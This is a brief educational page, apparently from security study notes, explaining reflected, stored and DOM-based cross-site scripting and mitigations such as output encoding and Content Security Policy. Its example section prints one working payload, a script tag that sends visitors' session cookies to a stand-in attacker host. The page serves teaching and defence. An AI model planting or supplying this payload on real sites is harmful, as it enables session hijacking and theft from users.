# 🕸️ Cross-Site Scripting (XSS)

!!! note "What is XSS?"
    Cross-Site Scripting (XSS) is a client-side vulnerability where an attacker injects malicious JavaScript into a trusted website. When a victim visits the site, their browser executes the script, allowing the attacker to steal session cookies, capture keystrokes, or redirect the user.

### How it Works
1. **Reflected XSS:** The malicious payload is embedded in a URL link. When the victim clicks the link, the server reflects the script back to the browser immediately.
2. **Stored XSS:** The payload is permanently saved on the server (like in a malicious forum post). Any user who visits that page will automatically execute the script.
3. **DOM-based XSS:** The vulnerability exists purely in the client-side JavaScript executing in the Document Object Model, without needing a server response.

### Real-World Example
An attacker posts a comment on a blog: `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`. Every person who loads that blog post gets their session cookies silently sent to the attacker.

### How to Mitigate
*   **Input Validation:** Filter out strict HTML tags on user input.
*   **Output Encoding:** Automatically escape all user-generated content so `<script>` turns into safe `&lt;script&gt;` blocks before rendering on the page.
*   **Content Security Policy (CSP):** Implement strict CSP headers to forbid the browser from executing unexpected inline scripts.

---

!!! success "Very Short Version (Easy to Remember)"
    *   **Concept:** Attacker injects malicious JavaScript into a web page that instantly executes in another user's browser.
    *   **Impact:** Stealing session cookies, keystroke logging, and hijacking user sessions.
    *   **Fix:** Strict output encoding, input validation, and implementing strong Content Security Policies (CSP).
